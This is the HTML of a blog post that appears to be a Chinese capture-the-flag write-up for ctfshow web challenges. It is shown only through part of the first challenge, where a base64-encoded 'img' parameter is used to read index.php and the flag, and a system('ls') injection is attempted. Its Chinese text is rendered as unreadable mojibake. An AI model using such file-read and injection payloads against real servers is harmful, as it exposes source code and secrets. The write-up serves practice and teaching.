<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='ctfshow-ÊÑö‰∫∫ÊùØ-web easy_signin 1.ÂÅöÈ¢òÊÄùË∑Ø ËßÇÂØüURLÔºåÂèëÁé∞ÊúâGET‰º†ÂèÇimgÔºå‰º†ÂèÇÂÜÖÂÆπÊòØbase64
?img=ZmFjZS5wbmc= base64Ëß£Á†ÅÂêéÂèëÁé∞‰º†ÂèÇÂÜÖÂÆπÊòØface.png
‰º†ÂèÇsystem(&amp;ldquo;ls&amp;rdquo;)ÔºõÁªèËøáÁºñÁ†ÅÂêéÁöÑbase64ÔºåÂèëÁé∞ËøîÂõû Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 ÁúãÂà∞‰∫ÜÊñá‰ª∂ËØªÂèñÂáΩÊï∞ÔºåËÄå‰∏îÁúãÂà∞Ë∑ØÂæÑÊúâ‰∏™index.phpÔºåËØïÁùÄËØªÂèñ‰∏Ä‰∏ãÁúãÁúã ‰º†ÂèÇÂêéÔºåÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂ∞ÜÂÖ∂base64Â§çÂà∂ÔºåÁÑ∂ÂêéËß£Á†ÅÔºåÊãøÂà∞flag
2.Áü•ËØÜÁÇπ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeÊòØÂú®RFC2397‰∏≠ÂÆö‰πâÁöÑÔºåÁõÆÁöÑÊòØÂ∞Ü‰∏Ä‰∫õÂ∞èÁöÑÊï∞ÊçÆÔºåÁõ¥Êé•ÂµåÂÖ•Âà∞ÁΩëÈ°µ‰∏≠Ôºå‰ªéËÄå‰∏çÁî®ÂÜç‰ªéÂ§ñÈÉ®Êñá‰ª∂ËΩΩÂÖ•„ÄÇÊØîÂ¶Ç‰∏äÈù¢ÈÇ£‰∏≤Â≠óÁ¨¶ÔºåÂÖ∂ÂÆûÊòØ‰∏ÄÂº†Â∞èÂõæÁâáÔºådataË°®Á§∫ÂèñÂæóÊï∞ÊçÆÁöÑÂçèÂÆöÂêçÁß∞Ôºåimage/png ÊòØÊï∞ÊçÆÁ±ªÂûãÂêçÁß∞Ôºåbase64 ÊòØÊï∞ÊçÆÁöÑÁºñÁ†ÅÊñπÊ≥ïÔºåÈÄóÂè∑ÂêéÈù¢Â∞±ÊòØËøô‰∏™image/pngÊñá‰ª∂base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ„ÄÇ
Data URI schemeÊîØÊåÅÁöÑÁ±ªÂûãÊúâÔºö
data:,ÊñáÊú¨Êï∞ÊçÆ data:text/plain,ÊñáÊú¨Êï∞ÊçÆ data:text/html,HTML‰ª£Á†Å data:text/html;base64,base64ÁºñÁ†ÅÁöÑHTML‰ª£Á†Å data:text/css,CSS‰ª£Á†Å data:text/css;base64,base64ÁºñÁ†ÅÁöÑCSS‰ª£Á†Å data:text/javascript,Javascript‰ª£Á†Å data:text/javascript;base64,base64ÁºñÁ†ÅÁöÑJavascript‰ª£Á†Å data:image/gif;base64,base64ÁºñÁ†ÅÁöÑgifÂõæÁâáÊï∞ÊçÆ data:image/png;base64,base64ÁºñÁ†ÅÁöÑpngÂõæÁâáÊï∞ÊçÆ data:image/jpeg;base64,base64ÁºñÁ†ÅÁöÑjpegÂõæÁâáÊï∞ÊçÆ data:image/x-icon;base64,base64ÁºñÁ†ÅÁöÑiconÂõæÁâáÊï∞ÊçÆ 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpÔºåbase64ÁºñÁ†ÅÔºöaW5kZXgucGhw Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?'>
<title>ctfshow-ÊÑö‰∫∫ÊùØ-web</title>

<link rel='canonical' href='https://relish1one.github.io/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/'>

<link rel="stylesheet" href="/scss/style.min.b520104728805017af298ac0ca9dc201454dbb7fb91074b04767eaca6465f278.css"><meta property='og:title' content='ctfshow-ÊÑö‰∫∫ÊùØ-web'>
<meta property='og:description' content='ctfshow-ÊÑö‰∫∫ÊùØ-web easy_signin 1.ÂÅöÈ¢òÊÄùË∑Ø ËßÇÂØüURLÔºåÂèëÁé∞ÊúâGET‰º†ÂèÇimgÔºå‰º†ÂèÇÂÜÖÂÆπÊòØbase64
?img=ZmFjZS5wbmc= base64Ëß£Á†ÅÂêéÂèëÁé∞‰º†ÂèÇÂÜÖÂÆπÊòØface.png
‰º†ÂèÇsystem(&amp;ldquo;ls&amp;rdquo;)ÔºõÁªèËøáÁºñÁ†ÅÂêéÁöÑbase64ÔºåÂèëÁé∞ËøîÂõû Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 ÁúãÂà∞‰∫ÜÊñá‰ª∂ËØªÂèñÂáΩÊï∞ÔºåËÄå‰∏îÁúãÂà∞Ë∑ØÂæÑÊúâ‰∏™index.phpÔºåËØïÁùÄËØªÂèñ‰∏Ä‰∏ãÁúãÁúã ‰º†ÂèÇÂêéÔºåÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂ∞ÜÂÖ∂base64Â§çÂà∂ÔºåÁÑ∂ÂêéËß£Á†ÅÔºåÊãøÂà∞flag
2.Áü•ËØÜÁÇπ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeÊòØÂú®RFC2397‰∏≠ÂÆö‰πâÁöÑÔºåÁõÆÁöÑÊòØÂ∞Ü‰∏Ä‰∫õÂ∞èÁöÑÊï∞ÊçÆÔºåÁõ¥Êé•ÂµåÂÖ•Âà∞ÁΩëÈ°µ‰∏≠Ôºå‰ªéËÄå‰∏çÁî®ÂÜç‰ªéÂ§ñÈÉ®Êñá‰ª∂ËΩΩÂÖ•„ÄÇÊØîÂ¶Ç‰∏äÈù¢ÈÇ£‰∏≤Â≠óÁ¨¶ÔºåÂÖ∂ÂÆûÊòØ‰∏ÄÂº†Â∞èÂõæÁâáÔºådataË°®Á§∫ÂèñÂæóÊï∞ÊçÆÁöÑÂçèÂÆöÂêçÁß∞Ôºåimage/png ÊòØÊï∞ÊçÆÁ±ªÂûãÂêçÁß∞Ôºåbase64 ÊòØÊï∞ÊçÆÁöÑÁºñÁ†ÅÊñπÊ≥ïÔºåÈÄóÂè∑ÂêéÈù¢Â∞±ÊòØËøô‰∏™image/pngÊñá‰ª∂base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ„ÄÇ
Data URI schemeÊîØÊåÅÁöÑÁ±ªÂûãÊúâÔºö
data:,ÊñáÊú¨Êï∞ÊçÆ data:text/plain,ÊñáÊú¨Êï∞ÊçÆ data:text/html,HTML‰ª£Á†Å data:text/html;base64,base64ÁºñÁ†ÅÁöÑHTML‰ª£Á†Å data:text/css,CSS‰ª£Á†Å data:text/css;base64,base64ÁºñÁ†ÅÁöÑCSS‰ª£Á†Å data:text/javascript,Javascript‰ª£Á†Å data:text/javascript;base64,base64ÁºñÁ†ÅÁöÑJavascript‰ª£Á†Å data:image/gif;base64,base64ÁºñÁ†ÅÁöÑgifÂõæÁâáÊï∞ÊçÆ data:image/png;base64,base64ÁºñÁ†ÅÁöÑpngÂõæÁâáÊï∞ÊçÆ data:image/jpeg;base64,base64ÁºñÁ†ÅÁöÑjpegÂõæÁâáÊï∞ÊçÆ data:image/x-icon;base64,base64ÁºñÁ†ÅÁöÑiconÂõæÁâáÊï∞ÊçÆ 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpÔºåbase64ÁºñÁ†ÅÔºöaW5kZXgucGhw Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?'>
<meta property='og:url' content='https://relish1one.github.io/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/'>
<meta property='og:site_name' content='R1one&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='web' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='ctfshow' /><meta property='article:tag' content='ÊÑö‰∫∫ÊùØ' /><meta property='article:tag' content='ÂèçÂ∫èÂàóÂåñ' /><meta property='article:tag' content='SSTI' /><meta property='article:tag' content='session' /><meta property='article:published_time' content='2023-05-29T13:02:16&#43;08:00'/><meta property='article:modified_time' content='2023-05-29T13:02:16&#43;08:00'/>
<meta name="twitter:title" content="ctfshow-ÊÑö‰∫∫ÊùØ-web">
<meta name="twitter:description" content="ctfshow-ÊÑö‰∫∫ÊùØ-web easy_signin 1.ÂÅöÈ¢òÊÄùË∑Ø ËßÇÂØüURLÔºåÂèëÁé∞ÊúâGET‰º†ÂèÇimgÔºå‰º†ÂèÇÂÜÖÂÆπÊòØbase64
?img=ZmFjZS5wbmc= base64Ëß£Á†ÅÂêéÂèëÁé∞‰º†ÂèÇÂÜÖÂÆπÊòØface.png
‰º†ÂèÇsystem(&amp;ldquo;ls&amp;rdquo;)ÔºõÁªèËøáÁºñÁ†ÅÂêéÁöÑbase64ÔºåÂèëÁé∞ËøîÂõû Warning: file_get_contents(system(&amp;ldquo;ls&amp;rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18 ÁúãÂà∞‰∫ÜÊñá‰ª∂ËØªÂèñÂáΩÊï∞ÔºåËÄå‰∏îÁúãÂà∞Ë∑ØÂæÑÊúâ‰∏™index.phpÔºåËØïÁùÄËØªÂèñ‰∏Ä‰∏ãÁúãÁúã ‰º†ÂèÇÂêéÔºåÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂ∞ÜÂÖ∂base64Â§çÂà∂ÔºåÁÑ∂ÂêéËß£Á†ÅÔºåÊãøÂà∞flag
2.Áü•ËØÜÁÇπ Data URI scheme 1 data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA Data URI schemeÊòØÂú®RFC2397‰∏≠ÂÆö‰πâÁöÑÔºåÁõÆÁöÑÊòØÂ∞Ü‰∏Ä‰∫õÂ∞èÁöÑÊï∞ÊçÆÔºåÁõ¥Êé•ÂµåÂÖ•Âà∞ÁΩëÈ°µ‰∏≠Ôºå‰ªéËÄå‰∏çÁî®ÂÜç‰ªéÂ§ñÈÉ®Êñá‰ª∂ËΩΩÂÖ•„ÄÇÊØîÂ¶Ç‰∏äÈù¢ÈÇ£‰∏≤Â≠óÁ¨¶ÔºåÂÖ∂ÂÆûÊòØ‰∏ÄÂº†Â∞èÂõæÁâáÔºådataË°®Á§∫ÂèñÂæóÊï∞ÊçÆÁöÑÂçèÂÆöÂêçÁß∞Ôºåimage/png ÊòØÊï∞ÊçÆÁ±ªÂûãÂêçÁß∞Ôºåbase64 ÊòØÊï∞ÊçÆÁöÑÁºñÁ†ÅÊñπÊ≥ïÔºåÈÄóÂè∑ÂêéÈù¢Â∞±ÊòØËøô‰∏™image/pngÊñá‰ª∂base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ„ÄÇ
Data URI schemeÊîØÊåÅÁöÑÁ±ªÂûãÊúâÔºö
data:,ÊñáÊú¨Êï∞ÊçÆ data:text/plain,ÊñáÊú¨Êï∞ÊçÆ data:text/html,HTML‰ª£Á†Å data:text/html;base64,base64ÁºñÁ†ÅÁöÑHTML‰ª£Á†Å data:text/css,CSS‰ª£Á†Å data:text/css;base64,base64ÁºñÁ†ÅÁöÑCSS‰ª£Á†Å data:text/javascript,Javascript‰ª£Á†Å data:text/javascript;base64,base64ÁºñÁ†ÅÁöÑJavascript‰ª£Á†Å data:image/gif;base64,base64ÁºñÁ†ÅÁöÑgifÂõæÁâáÊï∞ÊçÆ data:image/png;base64,base64ÁºñÁ†ÅÁöÑpngÂõæÁâáÊï∞ÊçÆ data:image/jpeg;base64,base64ÁºñÁ†ÅÁöÑjpegÂõæÁâáÊï∞ÊçÆ data:image/x-icon;base64,base64ÁºñÁ†ÅÁöÑiconÂõæÁâáÊï∞ÊçÆ 3.payload 1 2 ?img=aW5kZXgucGhw // index.phpÔºåbase64ÁºñÁ†ÅÔºöaW5kZXgucGhw Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 &amp;lt;?">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/ava_hu23b1ce8b171806f482798fb1ab4dbf94_485038_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">R1one&#39;s Blog</a></h1>
            <h2 class="site-description">‰øùÊåÅÁÉ≠Áà±Ôºå‰∫´ÂèóÂ≠§Áã¨</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/Relish1one'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
                <li id="i18n-switch">  
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                    <select name="language" onchange="window.location.href = this.selectedOptions[0].value">
                        
                            <option value="https://relish1one.github.io/" selected>English</option>
                        
                            <option value="https://relish1one.github.io/zh-cn/" >‰∏≠Êñá</option>
                        
                    </select>
                </li>
            
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#easy_signin">easy_signin</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1ÂÅöÈ¢òÊÄùË∑Ø">1.ÂÅöÈ¢òÊÄùË∑Ø</a></li>
            <li><a href="#2Áü•ËØÜÁÇπ">2.Áü•ËØÜÁÇπ</a></li>
            <li><a href="#3payload">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ">Ë¢´ÈÅóÂøòÁöÑÂèçÂ∫èÂàóÂåñ</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1ÂÅöÈ¢òÊÄùË∑Ø-1">1.ÂÅöÈ¢òÊÄùË∑Ø</a></li>
            <li><a href="#2Áü•ËØÜÁÇπ-1">2.Áü•ËØÜÁÇπ</a></li>
            <li><a href="#3payload-1">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_ssti">easy_ssti</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1ÂÅöÈ¢òÊÄùË∑Ø-2">1.ÂÅöÈ¢òÊÄùË∑Ø</a></li>
            <li><a href="#2sstiÊ≥®ÂÖ•">2.SSTIÊ≥®ÂÖ•</a></li>
            <li><a href="#3payload-2">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#ÊöóÁΩëËÅäÂ§©ÂÆ§">ÊöóÁΩëËÅäÂ§©ÂÆ§</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1ÂÅöÈ¢òÊÄùË∑Ø-3">1.ÂÅöÈ¢òÊÄùË∑Ø</a></li>
            <li><a href="#2payload‰∏ÄÊääÊ¢≠ËÑöÊú¨">2.payloadÔºö‰∏ÄÊääÊ¢≠ËÑöÊú¨</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_flask">easy_flask</a>
      <ol>
        <li>
          <ol>
            <li><a href="#flaskÁöÑsession‰º™ÈÄ†‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩpythonÂëΩ‰ª§ÊâßË°å">flaskÁöÑsession‰º™ÈÄ†+‰ªªÊÑèÊñá‰ª∂‰∏ãËΩΩ+pythonÂëΩ‰ª§ÊâßË°å</a></li>
            <li><a href="#1ÂÅöÈ¢òÊÄùË∑Ø-4">1.ÂÅöÈ¢òÊÄùË∑Ø</a></li>
            <li><a href="#2payload">2.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_php">easy_php</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1È¢òÁõÆÂàÜÊûê">1.È¢òÁõÆÂàÜÊûê</a></li>
            <li><a href="#2Áü•ËØÜÁÇπ-2">2.Áü•ËØÜÁÇπ</a></li>
            <li><a href="#3payload-3">3.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
    <li><a href="#easy_class">easy_class</a>
      <ol>
        <li>
          <ol>
            <li><a href="#1‰ª£Á†ÅÂàÜÊûê">1.‰ª£Á†ÅÂàÜÊûê</a></li>
            <li><a href="#2payload-1">2.payload</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctfshow/" >
                ctfshow
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/ctfshow-%E6%84%9A%E4%BA%BA%E6%9D%AF-web/">ctfshow-ÊÑö‰∫∫ÊùØ-web</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">May 29, 2023</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    15 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="ctfshow-ÊÑö‰∫∫ÊùØ-web">ctfshow-ÊÑö‰∫∫ÊùØ-web</h1>
<h2 id="easy_signin">easy_signin</h2>
<h4 id="1ÂÅöÈ¢òÊÄùË∑Ø">1.ÂÅöÈ¢òÊÄùË∑Ø</h4>
<p>ËßÇÂØüURLÔºåÂèëÁé∞ÊúâGET‰º†ÂèÇimgÔºå‰º†ÂèÇÂÜÖÂÆπÊòØbase64</p>
<p>?img=ZmFjZS5wbmc=
base64Ëß£Á†ÅÂêéÂèëÁé∞‰º†ÂèÇÂÜÖÂÆπÊòØface.png</p>
<p>‰º†ÂèÇsystem(&ldquo;ls&rdquo;)ÔºõÁªèËøáÁºñÁ†ÅÂêéÁöÑbase64ÔºåÂèëÁé∞ËøîÂõû
Warning: file_get_contents(system(&ldquo;ls&rdquo;);): failed to open stream: No such file or directory in /var/www/html/index.php on line 18
ÁúãÂà∞‰∫ÜÊñá‰ª∂ËØªÂèñÂáΩÊï∞ÔºåËÄå‰∏îÁúãÂà∞Ë∑ØÂæÑÊúâ‰∏™index.phpÔºåËØïÁùÄËØªÂèñ‰∏Ä‰∏ãÁúãÁúã
‰º†ÂèÇÂêéÔºåÊü•ÁúãÊ∫ê‰ª£Á†ÅÔºåÂ∞ÜÂÖ∂base64Â§çÂà∂ÔºåÁÑ∂ÂêéËß£Á†ÅÔºåÊãøÂà∞flag</p>
<h4 id="2Áü•ËØÜÁÇπ">2.Áü•ËØÜÁÇπ</h4>
<h5 id="data-uri-scheme">Data URI scheme</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAJAQMAAADaX5RTAAAAA3NCSVQICA
</span></span></code></pre></td></tr></table>
</div>
</div><p>Data URI schemeÊòØÂú®RFC2397‰∏≠ÂÆö‰πâÁöÑÔºåÁõÆÁöÑÊòØÂ∞Ü‰∏Ä‰∫õÂ∞èÁöÑÊï∞ÊçÆÔºåÁõ¥Êé•ÂµåÂÖ•Âà∞ÁΩëÈ°µ‰∏≠Ôºå‰ªéËÄå‰∏çÁî®ÂÜç‰ªéÂ§ñÈÉ®Êñá‰ª∂ËΩΩÂÖ•„ÄÇÊØîÂ¶Ç‰∏äÈù¢ÈÇ£‰∏≤Â≠óÁ¨¶ÔºåÂÖ∂ÂÆûÊòØ‰∏ÄÂº†Â∞èÂõæÁâáÔºådataË°®Á§∫ÂèñÂæóÊï∞ÊçÆÁöÑÂçèÂÆöÂêçÁß∞Ôºåimage/png ÊòØÊï∞ÊçÆÁ±ªÂûãÂêçÁß∞Ôºåbase64 ÊòØÊï∞ÊçÆÁöÑÁºñÁ†ÅÊñπÊ≥ïÔºåÈÄóÂè∑ÂêéÈù¢Â∞±ÊòØËøô‰∏™image/pngÊñá‰ª∂base64ÁºñÁ†ÅÂêéÁöÑÊï∞ÊçÆ„ÄÇ</p>
<p>Data URI schemeÊîØÊåÅÁöÑÁ±ªÂûãÊúâÔºö</p>
<ul>
<li>data:,ÊñáÊú¨Êï∞ÊçÆ</li>
<li>data:text/plain,ÊñáÊú¨Êï∞ÊçÆ</li>
<li>data:text/html,HTML‰ª£Á†Å</li>
<li>data:text/html;base64,base64ÁºñÁ†ÅÁöÑHTML‰ª£Á†Å</li>
<li>data:text/css,CSS‰ª£Á†Å</li>
<li>data:text/css;base64,base64ÁºñÁ†ÅÁöÑCSS‰ª£Á†Å</li>
<li>data:text/javascript,Javascript‰ª£Á†Å</li>
<li>data:text/javascript;base64,base64ÁºñÁ†ÅÁöÑJavascript‰ª£Á†Å</li>
<li>data:image/gif;base64,base64ÁºñÁ†ÅÁöÑgifÂõæÁâáÊï∞ÊçÆ</li>
<li>data:image/png;base64,base64ÁºñÁ†ÅÁöÑpngÂõæÁâáÊï∞ÊçÆ</li>
<li>data:image/jpeg;base64,base64ÁºñÁ†ÅÁöÑjpegÂõæÁâáÊï∞ÊçÆ</li>
